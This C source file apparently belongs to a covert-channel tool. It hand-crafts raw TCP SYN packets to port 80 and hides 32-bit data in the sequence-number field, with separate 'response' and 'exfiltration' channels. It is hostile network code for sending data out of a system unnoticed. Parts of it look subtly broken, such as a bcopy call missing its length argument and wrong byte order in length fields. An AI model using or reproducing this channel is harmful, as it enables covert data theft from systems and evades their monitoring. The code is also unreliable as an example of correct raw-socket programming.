/*
 * covert.c
 *
 *  Created on: Jun 4, 2014
 *      Author: root
 */

#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <sys/inotify.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <pthread.h>
#include <signal.h>
#include <sys/types.h>

#include "covert.h"
#include "util.h"

struct _tcp_dgram {
	struct iphdr ip;
	struct tcphdr tcp;
};

struct _pseudo_hdr {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
};

struct iphdr prep_ip(uint32 src_addr, uint32 dst_addr) {
	struct iphdr ip_hdr;

	ip_hdr.ihl = IPHDR_LEN;
	ip_hdr.version = IP_VER;
	ip_hdr.tot_len = 0;
	ip_hdr.id = htonl(randomRange(5000, 5050) + IP_ID);
	ip_hdr.ttl = TTL;
	ip_hdr.protocol = IPPROTO_TCP;
	ip_hdr.frag_off = 0;
	ip_hdr.saddr = src_addr;
	ip_hdr.daddr = dst_addr;
	ip_hdr.check = 0;

	return ip_hdr;
}

struct tcphdr prep_tcp(int type) {
	struct tcphdr tcp;

	// TCP HEADER INITIALIZATION
	switch (type) {
	case RSP_TYP:
		tcp.source = htons(RSP_PORT);
		break;
	case XFL_TYP:
		tcp.source = htons(XFL_PORT);
		break;
	}
	tcp.dest = htons(80);
	tcp.seq = 0;
	tcp.ack_seq = 0;
	tcp.doff = 5;
	tcp.res1 = 0;
	tcp.fin = 0;
	tcp.syn = 1;
	tcp.rst = 0;
	tcp.psh = 0;
	tcp.ack = 0;
	tcp.urg = 0;
	tcp.res2 = 0;
	tcp.window = htons(512);
	tcp.check = 0;
	tcp.urg_ptr = 0;

	return tcp;
}

void _send(uint32 src_addr, uint32 dest_addr, uint32 data, int chan) {
	struct _tcp_dgram packet;
	struct _pseudo_hdr pseudo;
	struct sockaddr_in sin;
	int sock;
	int one = 1;

	srand(getpid() * time(NULL));

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0)
		error("_send(): Unable to open sending socket.");

	// Tell kernel not to help us out
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
		error("_send(): Kernel won't allow IP header override.");

	memset(&packet, 0, sizeof(packet));

	packet.ip = prep_ip(src_addr, dest_addr);
	packet.tcp = prep_tcp(chan);

	packet.tcp.seq = data;
	packet.ip.tot_len = htons(sizeof(packet.ip) + sizeof(packet.tcp));

	packet.ip.check = chksum((unsigned short *) &packet.ip, 20);

	memset(&pseudo, 0, sizeof(pseudo));

	pseudo.source_address = packet.ip.saddr;
	pseudo.dest_address = packet.ip.daddr;
	pseudo.protocol = packet.ip.protocol;
	pseudo.placeholder = 0;
	pseudo.tcp_length = sizeof(packet.tcp);
	//pseudo.tcp = packet.tcp;

	bcopy((char *)&packet.tcp, (char *)pseudo.tcp);
	packet.tcp.check = chksum((unsigned short *) &pseudo, 32);

	sin.sin_family = AF_INET;
	sin.sin_port = packet.tcp.dest;
	sin.sin_addr.s_addr = packet.ip.daddr;

	sendto(sock, &packet, packet.ip.tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
	close(sock);
}

/*-------- Checksum Algorithm (Public domain Ping) ----------------------*/
unsigned short chksum(unsigned short *addr, int len) {
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	/*
	 * Our algorithm is simple, using a 32 bit accumulator (sum), we add
	 * sequential 16 bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 */
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* 4mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	/* 4add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
	sum += (sum >> 16); /* add carry */
	answer = ~sum; /* truncate to 16 bits */
	return (answer);
}

